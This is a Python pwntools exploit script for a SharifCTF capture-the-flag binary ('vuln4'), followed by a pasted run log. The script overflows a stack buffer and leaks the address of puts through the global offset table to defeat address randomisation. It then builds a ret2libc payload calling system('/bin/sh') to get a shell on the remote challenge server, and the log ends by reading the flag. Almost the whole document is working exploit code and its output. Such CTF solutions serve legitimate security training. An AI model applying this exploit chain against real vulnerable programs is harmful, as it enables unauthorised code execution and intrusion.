#!/usr/bin/env python
from pwn import *

local = False
p = process('./vuln4') if local else remote('ctf.sharif.edu', 4801)

binary = ELF('./vuln4')
libc = ELF('libc.so.6')

stager  = ''
stager += 'A' * 22
stager += p32(binary.symbols['puts'])
stager += p32(0x080484EA) # fflush @ main
stager += p32(binary.got['puts'])

p.sendlineafter('yourself', stager)

p.recv()
leak = p.recv(4)

puts_libc = u32(leak)
log.success('Puts @ {:#x}'.format(puts_libc))

libc_base = puts_libc - libc.symbols['puts']
log.info('Libc @ {:#x}'.format(libc_base))

payload  = ''
payload += 'A' * 22
payload += p32(libc_base + libc.symbols['system'])
payload += p32(libc_base + libc.symbols['exit'])
payload += p32(libc_base + libc.search('/bin/sh').next())

p.sendline(payload)

p.interactive()

'''
[+] Opening connection to ctf.sharif.edu on port 4801: Done
[*] '/media/sf_Kali/sharif/vuln4/vuln4'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/media/sf_Kali/sharif/vuln4/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Puts @ 0xb7586ca0
[*] Libc @ 0xb7527000
[*] Switching to interactive mode
This time it is randomized...
You should find puts yourself
$ cat /home/ctfuser/flag
SharifCTF{7af9dab81dff481772609b97492d6899}
'''